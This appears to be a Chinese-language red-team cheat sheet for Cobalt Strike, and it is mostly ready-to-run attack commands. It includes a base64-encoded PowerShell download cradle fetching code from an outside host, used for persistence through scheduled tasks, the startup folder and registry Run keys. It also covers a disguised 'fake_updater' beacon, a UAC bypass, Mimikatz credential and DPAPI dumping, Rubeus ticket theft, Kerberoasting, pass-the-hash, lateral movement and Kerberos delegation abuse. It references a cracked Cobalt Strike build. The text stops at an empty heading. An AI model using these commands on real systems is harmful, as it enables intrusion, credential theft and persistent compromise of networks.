
# 基本
- **建立服务器（攻击者）:**
```bash
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
sudo ./teamserver [Attack IP] [Set Password] [配置文件]
```

- **链接服务器（攻击者）：**
直接启动 Cobalt Strike 客户端然后输入凭据链接即可。


#### 被动信息收集
Attack > System Profiler
可以设置重定向，后复制网址到被攻击机器，访问后就可以得到机器的基本信息。


#### 设置监听器
**http** (出口监听器)
**dns** (出口监听器)
**smb (p2p)** ：  可以使用 `PS C: \> ls \\.\pipe\` 列出所有当前正在收听的管道以获取灵感。
比如说 `TSVCPIPE-7ca725ce-7220-489f-a9b5-d4cad2bc1337`
**tcp**
**tcp-local**


#### 生成有效载荷
在 Payloads 中选择 `Windows Stageless Generate All Payloads`，生成所有有效载荷, 执行 http_x64.exe 后即可收到回应。


#### 命令 (Beacon)
```
pwd   当前目录路径
sleep 5   更快的回应
ps
screenshot
keylogger  (View > Keystrokes)    (使用jobs可以查看任务，jobkill ID 可以杀死keylogger的job)
clipboard  （粘贴板内容）
net logons  (用户登录会话)
run wmic service get name, pathname  (每个服务的列表及其可执行文件的路径)
shell + CMD
execute-assembly C:\Users\13461\Desktop\KALI_Tools\Seatbelt.exe -group=system (https://github.com/GhostPack/Seatbelt)
getuid

```


#### 数据透视侦听器
作用为转发流量，隐藏活动等
在图像界面右键 Attack 然后 Pivoting > Listener, 创建 demo-pivot
生成有效载荷： Payloads > Windows Executable (Stageless), 选中刚刚创建的 demo-pivot , 生成后直接执行即可。


#### 主机持久性
https://github.com/mandiant/SharPersist (添加各种命令要用到的工具)
BASE 编码要执行的命令
```
Win: 
$str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.55.128:80/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

Linux:
echo 'IEX ((new-object net.webclient).downloadstring("http://192.168.55.128:80/a"))' | iconv -t UTF-16LE | base64 -w 0
```

- 计划任务程序
```powershell
execute-assembly C:\Users\13461\Desktop\KALI_Tools\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA1AC4AMQAyADgAOgA4ADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
```
`-t`: 持久化选项
`-c`: 执行的命令
`-a`: 命令的参数
`-n`: 任务的名称
`-m`: 添加任务(也可以 `remove`、`check` 和 `list`)
`-o`: 任务频率


- 启动文件夹
```powershell
execute-assembly C:\Users\13461\Desktop\KALI_Tools\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA1AC4AMQAyADgAOgA4ADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
```
`-f`: 另存为的文件名


- 注册表自动运行
```powershell
cd C:\ProgramData
upload C:\Users\13461\Desktop\CobaltSrike_4.9.1_Cracked_www.ddosi.org\Payloads\beacon_x64.exe
mv beacon_x64.exe fake_updater.exe
execute-assembly C:\Users\13461\Desktop\KALI_Tools\SharPersist.exe -t reg -c "C:\ProgramData\fake_updater.exe" -a "/q /n" -k "hkcurun" -v "fake_updater" -m add
```
`-k`: 修改的注册表项
`-v`: 创建的注册表项的名称


#### UAC Bypass / Mimikatz / Rubeus
- UAC Bypass
```bash
elevate uac-schtasks tcp-local (UAC bypass)
以高完整性运行
```

- Mimikatz 系列
```bash
beacon> mimikatz token::elevate ; lsadump::sam

也可以将 'token::elevate' 代替为 '!'
beacon> mimikatz !lsadump::sam (转储本地帐户的 NTLM 哈希)

beacon> mimikatz !sekurlsa::logonpasswords (转储内存中的NTLM明文密码)
beacon> mimikatz !sekurlsa::ekeys (转储当前登录用户的 Kerberos 加密密钥, AES256 密钥就是我们想要的密钥)
beacon> mimikatz !lsadump::cache  (域缓存凭证, MsCacheV2只能离线破解，需要格式化格式 $DCC2$<iterations>#<username>#<hash>)

(都会留下敏感资源的句柄)
```

- Rebeus
https://github.com/GhostPack/Rubeus
列出计算机上所有登录会话中的所有 Kerberos 票证
```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt [/nowrap (将Base64(key)格式化到一行,方便复制)] (获取TGT)
```
Rubeus 的 `dump` 命令将从内存中提取这些票证 - 但由于它使用 WinAPIs，因此不需要向 LSASS 打开可疑句柄。


# 域内技术
#### 内网上线 CS
- 正向链接
生成 Beacon TCP , 0.0.0.0 4444
拿到域内 shell 后上传执行 exe，外网主机 connect 域内执行 exe 的主机
```
connect 10.0.20.99 4444  
```

- 反向链接
转发上线 -> 监听地址选择能访问的内网主机 ip -> Save
直接 exe 上线即可


#### 枚举
PowerView
```bash
beacon> powershell-import C:\Users\13461\Desktop\KALI_Tools\PowerView.ps1

beacon> powershell Get-Domain [-Domain]（有用的信息包括域名、林名称和域控制）
beacon> powershell Get-DomainController [-Domain] | select Forest, Name, OSVersion | fl （返回当前域或指定域的域控制器）
beacon> powershell Get-ForestDomain [-Forest] (返回当前林或 `-Forest` 指定的林的所有域)
beacon> powershell Get-DomainPolicyData | select -expand SystemAccess (返回当前默认域策略)
beacon> powershell Get-DomainUser -Identity UserName -Properties DisplayName, MemberOf | fl
beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName (返回所有计算机或特定计算机对象)
beacon> powershell Get-DomainOU -Properties Name | sort -Property Name (OU)
beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName (组对象)
beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName (组内用户)
beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName （组策略对象）
```

SharpView
https://github.com/tevora-threat/SharpView
```
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```


#### 用户模拟
-  Hash 传递
```bash
beacon> pth win2016\system 570a9a65db8fba761c1008a51d4c95ab (模拟hash会话)
beacon> rev2self (恢复初始会话)
```

- make_token
```bash
beacon> make_token win2016\administrator Admin@123
beacon> remote-exec psexec/winrm/wmi win2016 whoami
```


#### 横向移动
```
beacon> jump winrm64 win2016 smb   (返回一个高完整性Beacon，该会话以交互的用户身份运行)
beacon> jump psexec64 win2016 smb (Beacon用户为SYSTEM)
```

- WMI
```
beacon> cd C:\progarmdata\
beacon> upload C:\Users\13461\Desktop\CobaltSrike_4.9.1_Cracked_www.ddosi.org\Payloads\smb_x64.exe
beacon> remote-exec wmi win2016 C:\programdata\smb_x64.exe
beacon> link win2016 msagent_cf
```
*其中, msagent_cf 为 smb_beacon 的 pipe 名字


#### 会话传递
- CS 上线主机 -> MSF
*Beacon 一定是得是 Stageless 的 reverse_http, 并且 Foreign 的 HTTP port 是没有被使用过的
```bash
msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
...
msf6 exploit(multi/handler) > run

beacon> spawn msf
```
在 msf 中即可收到会话


#### 解密
-  解密DPAPI
```bash
(枚举用户的 vault)
1) beacon> run vaultcmd /list  
2) beacon> execute-assembly C:\Tools\Seatbelt.exe WindowsVault (枚举用户的 vault)

(加密凭证存储位置)
1) beacon> ls C:\Users\[username]\AppData\Local\Microsoft\Credentials  
2) beacon> execute-assembly C:\Tools\Seatbelt.exe WindowsCredentialFiles

(获取加密秘钥, 请求key)
1) beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-xxxxxx 
	# 类似于 'bfc5090d-22fe-4058-8953-47f6882f549e' 就是
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-xxxxxx\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
2) beacon> mimikatz !sekurlsa::dpapi  (如果最近有访问/解密解密, 就会留下缓存, MasterKey)

(解密 blob)
beacon> mimikatz dpapi::cred /in:C:\Users\[username]\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
```

- 解密计划任务凭据
```bash
(定位blob)
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials  

(查看guidMasterKey)
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

(转储缓存的 key, 记得对应GUID=guidMasterKey)
beacon> mimikatz !sekurlsa::dpapi

(解密)
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
```


#### kerberos 攻击
- GetUserSPNs.py (Kerberoasting)
```
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /simple /nowrap
然后john the hash

(可选，枚举设置了 SPN 的域用户)
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName  
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```

- ASREP Roasting
```
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
beacon> execute-assembly C:\Tools\Rubeus.exe asreproast /user:squid_svc /nowrap
```

##### [!] 约束委派攻击
- **无(非)约束委派**
非约束委派：当 `user` 访问 `service1` 时，如果 `service1` 的服务账号开启了 `unconstrained delegation`（非约束委派），则当 `user` 访问 `service1` 时会将 `user` 的 `TGT` 发送给 `service1` 并保存在内存中以备下次重用，然后 `service1` 就可以利用这张 `TGT` 以 `user` 的身份去访问域内的任何服务（任何服务是指 `user` 能访问的服务）
```
beacon> execute-assembly C:\Users\13461\Desktop\KALI_Tools\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage （查找缓存是否有TGT的krbtgt)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap (提取TGT并利用)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
beacon> steal_token 1540
```

强制计算机帐户对这台计算机进行远程身份验证来获取计算机的 TGT
```
beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap  (监控缓存所有新的TGT)
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe 目标domain 攻击(监听)domain  
```

- **约束委派**
S4U2Self：   允许服务代表用户获取其自身的 TGS
S4U2Proxy：允许该服务代表用户为第二个服务获取 TGS

通过允许约束委派的用户 , 就可以模拟域内任意用户获取 TGS 票据( .kirbi File ), 并注入到会话, 访问资源等
```
(查找拥有约束委派的计算机用户)
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

AdFind.exe -h 10.10.10.8 -u redteam-iis -up Server12345 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto

(利用 kekeo 请求该用户的 TGT)   (!! 也可以跳转到rubeus方法 !!)
kekeo.exe 
tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 [/ticket:administrator.kirbi]
	/user: 服务用户的用户名 
	/password: 服务用户的明文密码 
	/domain: 所在域名
	/ticket: 可选参数，指定文件名，可能没用

(使用这张 TGT 通过伪造 s4u 请求以 administrator 用户身份请求访问 DOMAIN CIFS的 ST)
tgs::s4u /tgt:TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/AD-2008.redteam.red

_____________________________________________
* 使用 Rubeus.exe: (举例为 sql-2$ 设定为拥有约束委派的权限)

(需要获得受信任的约束委派账户的TGT)
beacon> execute-assembly C:\Tools\Rubeus.exe triage (查询否有那个账户的TGT, Service一般是 krbtgt/DOMAIN)
(如果拥有用户的明文密码或者hash ， 也可以使用asktgt请求TGT)

(获取TGT, Base64EncodedTicket)
beacon> execute-assembly C:\Tools\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

(执行S4U获取模拟用户的服务的TGS)
# beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:admin /msdsspn:cifs/DOMAIN_FQDN /user:sql-2$ /ticket:doIFLD[...]MuSU8= /nowrap
#    /impersonateuser 是要模拟的用户
#    /msdsspn 是允许约束委派用户委托的服务主体名称， 可以改为LDAP
#    /user 是允许执行委托的主体，就是允许约束委派的用户
#    /ticket 是 /user 的 TGT(Base64EncodedTicket)
(优先选择请求LDAP的TGS) (对于域控制器)
* beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:admin /msdsspn:cifs/DOMAIN_FQDN /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

(使用 S4U2Proxy 票证传递到新的会话中)
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:admin /password:FakePass /ticket:doIGaD[...]ljLmlv
beacon> steal_token 5540 (偷窃刚刚创建的ProcessID)

(验证可用性)
# beacon> ls \\DOMAIN\c$   (!注意使用 FQDN，不然报错)
* beacon> dcsync DOMAIN_FQDN DEV\krbtgt  (对于域控制器)
```

- **基于资源的约束委派**